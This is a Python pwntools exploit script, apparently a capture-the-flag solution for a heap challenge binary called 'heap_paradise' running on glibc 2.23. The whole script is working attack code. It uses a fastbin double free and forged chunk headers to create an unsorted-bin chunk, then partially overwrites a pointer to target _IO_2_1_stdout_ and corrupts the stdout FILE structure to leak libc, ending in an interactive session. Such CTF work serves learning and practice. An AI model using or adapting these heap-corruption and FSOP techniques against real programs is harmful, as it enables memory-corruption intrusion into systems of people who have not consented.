#!/usr/bin/env python3
from pwn import *

PAD = lambda n: b"a" * n
DUMMY = 0xdeadbeefdeadbeef
QWORD = 8
CHUNK_HDR = QWORD * 2

_IO_CURRENTLY_PUTTING = 0x1000
_IO_IS_APPENDING = 0x800
_IO_NO_WRITE = 0x8
STDOUT = 1

ld = ELF("ld-2.23.so")
elf = ELF("./heap_paradise_patched")
libc = ELF("./given/libc_64.so.6")

context.arch = elf.arch
context.terminal = ["tmux", "splitw", "-h"]

if args.REMOTE:
    p = remote()
else:
    p = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
    if args.D:
        with open(f"/proc/{p.pid}/maps", "rb") as f:
            maps = f.read()
            f.close()
        regions = maps.split(b"\n")
        pie_base = None
        for region in regions:
            if b"heap_paradise_patched" in region:
                pie_base = int(region[:region.find(b"-")], 16)
                break
        if pie_base is None:
            quit()
        log.info(f"pie base: {hex(pie_base)}")
        log.info(f"metadata[0xf]: {hex(pie_base + 0x202040)}")
        gdb.attach(p, "\n".join([
            #f"b *{hex(pie_base + 0xdc6)}", # b4 free
            f"b *{hex(pie_base + 0xe26)}", # main's exit
        ]))

class FakeChunk:
    def __init__(self, size, prev_size=0, fwd=0, bck=0, nxt_fwd=0, nxt_bck=0):
        self.prev_size = prev_size
        self.size = size
        self.fwd = fwd
        self.bck = bck
        self.nxt_fwd = nxt_fwd
        self.nxt_bck = nxt_bck

    def dump_header(self, A=0, M=0, P=0):
        return p64(self.prev_size) + p64(self.size | P)

    def dump_allocated(self, A=0, M=0, P=0):
        return self.dump_header(A=A, M=M, P=P).ljust(self.size, b"\x00")

num_data = 0
def alloc_data(size, data):
    global num_data
    assert(len(data) <= size)
    assert(num_data < 15)

    p.sendlineafter(b"You Choice:", b"1")
    p.sendlineafter(b"Size :", str(size).encode())
    p.sendafter(b"Data :", data)
    idx = num_data
    num_data += 1
    return idx

def free_data(index):
    p.sendlineafter(b"You Choice:", b"2")
    p.sendlineafter(b"Index :", str(index).encode())

def fastbin_dup_into_unsortedbin(fastbin_chunk_size):
    """
    Goal: Free an unsortedbin chunk
    Fastbin dup while also accompishing the following steps (in commenmt)
    layout:
      | a_hdr |  ----- a data -----  | b_hdr |  ----- b data ----- |
                 |fake0_hdr| ------- fake0_data ------- |fake1_hdr|
              |  |                           |          |
               ^ fake_chunk_offset            ^ offset2
    """
    # constants
    unsortedbin_chunk_size = 0xa0
    fake_chunk_offset = 0x10

    # make request size algined for simplicity
    req_size = fastbin_chunk_size - 0x10
    log.info(f"Going to request {hex(req_size)} size")

    # step 1: fake a "fastbin chunk"
    fake0 = PAD(fake_chunk_offset) + FakeChunk(size=fastbin_chunk_size).dump_header(P=1)
    chunk00 = alloc_data(req_size, fake0)

    # step2: prepare "next unsortedbin chunk"
    offset2 = (fake_chunk_offset + unsortedbin_chunk_size) - (req_size + CHUNK_HDR)
    fake1 = PAD(offset2) + FakeChunk(size=0x20).dump_header(P=1)
    chunk70 = alloc_data(req_size, fake1)

    free_data(chunk00)
    free_data(chunk70)
    free_data(chunk00)

    # overwrite the last byte to get the address, i.e. crafting chunk20.data
    alloc_data(req_size, p8(CHUNK_HDR + fake_chunk_offset))
    alloc_data(req_size, p64(DUMMY))
    alloc_data(req_size, p64(DUMMY))

    # Step 3: transform fastbin chunk into unsortedbin chunk
    # we need to arbitrary write a fastbin chunk and then
    # make it into a unsortedbin chunk to bypass
    #       malloc(): memory corruption (fast)
    unsorted_chunk = alloc_data(req_size, p64(DUMMY))

    free_data(chunk00)
    fake0 = PAD(fake_chunk_offset) + FakeChunk(size=unsortedbin_chunk_size).dump_header(P=1)
    alloc_data(req_size, fake0)
    free_data(unsorted_chunk)
    log.info(f"Successfully created a unsortedbin chunk at {unsorted_chunk}")

    chunk20 = unsorted_chunk
    return [chunk00, chunk20, chunk70]

def fsop_leak_libc(fastbin_chunk_size, chunks):
    """
      | a_hdr |  ----- a data -----  | b_hdr |  ----- b data ----- |
                 |fake0_hdr| ------- fake0_data ------- |fake1_hdr|
    """
    chunk00, chunk20, chunk70 = chunks
    req_size = fastbin_chunk_size - 0x10

    log.info(f"At this point, heap {chunk00, chunk20, chunk70} is allocated")
    fsop = FileStructure()
    fsop.flags = (0xfbad0000|_IO_CURRENTLY_PUTTING|_IO_IS_APPENDING) & (~_IO_NO_WRITE)
    log.info(f"flags: {hex(fsop.flags)}")
    fsop.fileno = STDOUT

    # push heap address at heap_page + 0x80
    free_data(chunk00)
    free_data(chunk70)

    x = alloc_data(req_size + 0x10, p64(0) * 9 + p64(0x71) + p8(0xa0))
    free_data(x)

    alloc_data(req_size, p64(0) * 5 + p64(0x71) + p64(libc.sym["_IO_2_1_stdout_"] - 0x43)[:2]) # chunk70
    alloc_data(req_size, b'A') # chunk00
    alloc_data(req_size, b"\x00" * 0x33 + p64(fsop.flags) + p64(0) * 3 + b"\x88")

def exploit():

    fastbin_chunk_size = 0x70
    chunks = fastbin_dup_into_unsortedbin(fastbin_chunk_size)
    fsop_leak_libc(fastbin_chunk_size, chunks)

    p.sendlineafter(b"You Choice:", b"3")
    p.interactive()

if __name__ == "__main__":
    exploit()
